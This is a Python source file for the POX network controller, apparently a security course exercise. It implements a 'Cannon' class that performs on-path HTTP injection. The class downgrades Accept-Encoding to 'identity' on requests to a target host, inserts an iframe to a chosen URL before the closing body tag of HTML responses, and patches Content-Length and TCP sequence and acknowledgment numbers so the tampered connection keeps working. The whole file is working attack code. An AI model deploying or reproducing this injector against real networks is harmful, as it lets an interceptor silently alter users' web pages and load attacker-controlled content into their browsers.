from pox.lib.packet.ipv4 import ipv4
import re
import math

class Cannon(object):
    
    def __init__ (self, target_domain_re, url_path_re, iframe_url):

        # passed from forawading/dummy
        self.target_domain_re = target_domain_re    #TARGET_DOMAIN_RE = re.compile(r'^blink.ucsd.edu$', re.I)
        self.url_path_re = url_path_re              #URL_PATH_RE = re.compile(r'^/~bjohhnne', re.I)
       
        self.iframe_url = iframe_url                # IFRAME_URL = 'http://cryptosec.ucsd.edu'

        self.lenDiffDict = dict()   # store the lenght difference from clinet to server, the key is one way 
    
        self.iframe = '<iframe src="' + str(self.iframe_url) + '"></iframe>'  # construct an iframe to be injected

    # Input: an instance of ipv4 class
    # Output: an instance of ipv4 class or None
    def manipulate_packet (self, ip_packet):
        # check if its a  TCP packet, 
        #return ip_packet
        if ip_packet.protocol == ipv4.TCP_PROTOCOL:
            #print   str(ip_packet.payload.seq), "  ",  str(ip_packet.payload.ack) 

            http = ip_packet.payload.payload            # grap http pactet

            #print "###############################\n" , http
            #use pox API  grap 4 tupes
            srcIP =  ip_packet.srcip
            dstIP =  ip_packet.dstip
            srcPort = ip_packet.payload.srcport
            dstPort = ip_packet.payload.dstport

            
            # decide with directionthe packet is sending to 
            fourTuple = (srcIP,dstIP,srcPort,dstPort)
            reverseFourTuple = (dstIP,srcIP,dstPort,srcPort)

            ###########################################################
            # modify ack sending from client  to server 
            # if client to server, ack - lenDiffDict
            if fourTuple in self.lenDiffDict:
                if self.lenDiffDict[fourTuple] != 0:
                    ip_packet.payload.ack = int((ip_packet.payload.ack - self.lenDiffDict[fourTuple]) % (math.pow(2, 32) ))
            # modify seq  sending from server to client 
            # if server to clinet, seq + lenDiffDict
            if reverseFourTuple in self.lenDiffDict:    
                if self.lenDiffDict[reverseFourTuple] != 0:           
                    ip_packet.payload.seq =  int((ip_packet.payload.seq + self.lenDiffDict[reverseFourTuple]) % (math.pow(2,32) ))
            #print "src = ", srcIP, "srcPort = ", srcPort
            #print "dst = ", dstIP, "dstPort = ", dstPort

            # check if get request, find accept encoding, change to "indentity", space patterning
            if "GET" in http:
                
                #filter only target host and URL
                host = re.search("Host: (.*)\r\n", http).group(1)
                path = re.search("GET (.*) HTTP/1.1",http).group(1)

                if re.search(self.target_domain_re,host)!=None and re.search(self.url_path_re,path)!=None:
                    ###########################################################
                    # step1: create mapping from fourTuple to content length difference 
                    if fourTuple not in self.lenDiffDict:
                        self.lenDiffDict[fourTuple] = 0

                    ###########################################################
                    # step2: change the encoding to "identity" with space padding 
                    start = http.find("Accept-Encoding: ")
                    if start != -1:
                        end = http.index("\r\n", start)
                        
                        oldEncoding = http[(start+len("Accept-Encoding: ")):end]
                        newEncoding = "identity" + " "*(len(oldEncoding) - len( "identity"))
                        http = http.replace(oldEncoding, newEncoding)

            # respond packet 
            if "Content-Length" in http and reverseFourTuple in self.lenDiffDict and "Content-Type: text/html" in http:

                # modify content length
                lenStart = http.index("Content-Length: ")
                lenEnd = http.index('\r\n', lenStart)
                contentLength = http[(lenStart+len("Content-Length: ")):lenEnd]
                newContentLength = str(int(contentLength) + len(self.iframe))
                print contentLength
                print newContentLength
                #http = http.replace(contentLength, newContentLength)
                http = http[:(lenStart+len("Content-Length: "))] + newContentLength + http[lenEnd:]
             
                if len(newContentLength) > len(contentLength):   # carry out 
                    self.lenDiffDict[reverseFourTuple] += 1
           
            if "</body>" in http and reverseFourTuple in self.lenDiffDict:
                bodyStart = http.index("</body>")
                bodyMark = http[bodyStart: (bodyStart + len("</body>"))]
                #http = http.replace(bodyMark, newbodyMark)
                http = http[:bodyStart] + self.iframe + http[bodyStart:]

                self.lenDiffDict[reverseFourTuple] += len(self.iframe) 

            # Must return an ip packet or None
            ip_packet.payload.payload = http
        return ip_packet